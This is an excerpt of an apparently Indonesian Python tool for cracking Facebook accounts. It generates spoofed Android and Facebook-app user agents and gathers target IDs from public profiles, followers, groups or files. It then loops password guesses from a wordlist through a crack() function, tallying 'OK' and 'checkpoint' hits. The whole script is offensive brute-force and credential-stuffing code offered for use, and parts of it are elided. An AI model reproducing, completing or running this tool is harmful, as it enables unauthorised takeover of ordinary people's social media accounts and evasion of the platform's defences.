...
for xd in range(10000):
	...
	uaku='Mozilla/5.0 (Linux; Android 12 {a}; SM-M515F Build/SP1A.210812.016; wv)  AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)
...
for xyz in range(10000):
	...
	ua1 = f"Dalvik/2.1.0 (Linux; U; Android 8.0.0; {str(rr(6,12))}; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/{str(rr(99,299))}196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/{str(rr(10000000,90000000))};135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/{str(rr(6,12))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920};FB_FW/1;]"
	ua2 = f"Dalvik/2.1.0 (Linux; U; Android 6.0.1; {versi_android}; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV{str(rr(70,250))}273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/{str(rr(10000000,90000000))};218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]"
	ua3 = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/{str(rr(70,250))}.273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/{str(rr(10000000,90000000))};FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]"
...
#adell_ganteng(f'SEBELUM CRACK DIMULAI JANGAN LUPA BERDOA DAN BERSIKAP SOPAN')
#adell_ganteng(f'DIHARAPKAN JANGAN TERLALU SERING CRACK,DAN JAN SERING COLI')
#adell_ganteng(f'KARNA BISA MENYEBAB KAN IP ANDA KESPAM DAN KAUTA HABISSS')
adell_ganteng(f'SEDANG LOGIN KEDALAM TOOLS HARAP TUNGGU,JAN MANJA AMAT')
time.sleep(3)
#------------[ INDICATION ]---------------#
		...
		ses.headers.update(
			{
				...
				'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930W8 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/112.0.0.17.70;]', 
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang [purple]%s[blue]Bro Semoga Betah pakai Sc Ini'%(my_name)))
	adell_xd=(f'>> Your Idz : '+str(my_id))
	adell_xd=(f'>> Your Ip  : {ip}')
	print('')
	print('>> 1. ☞CLONING PUBLICK☜ ')
	print('>> 2. ☞CLONING FOLLOWERS☜ ')
	print('>> 3. ☞CLONING GROUP☜   ')
	print('>> 4. ☞CLONING FILE☜	')
	print('>> 5. HASIL CLONING  ')
	print('>> 0. KELUAR       ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>>  BERAPA TARGET CLONING---> : '))
	except ValueError:
		print('>> Masukkan Angka , Malah Hurup ')
		exit()
	if jum<1 or jum>100:
	...
	try:
		print('')
		print(f'>> TOTAL IDZ CLONING YG TERKUMPUL---->{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}>> 1. AKUN FB OLD ')
	print('>> 2. AKUN FB NEW')
	print('>> 3. AKUN FB RANDOM ')
	print('')
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}ROBET XD PECINTA ANIME SAD>>>> ')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{H}[R] {P}{b}{loop}{P}-{u}{len(id)}{P}-{P}{H}{ok}{P}-{P}{k}{cp}{x}-{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice('Android 6.0.1; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/325.0.1.4.108;Mozilla/5.0 (Linux; Android 10; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 UCBrowser/11.3.0.1130 (UCMini) MobileMozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/293.0.0.9.114;')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, style='purple')
					cetak(nel(statusok1, title='[bold purple]AOREC-XD OK[/purple]'))
					ok+=1
					break
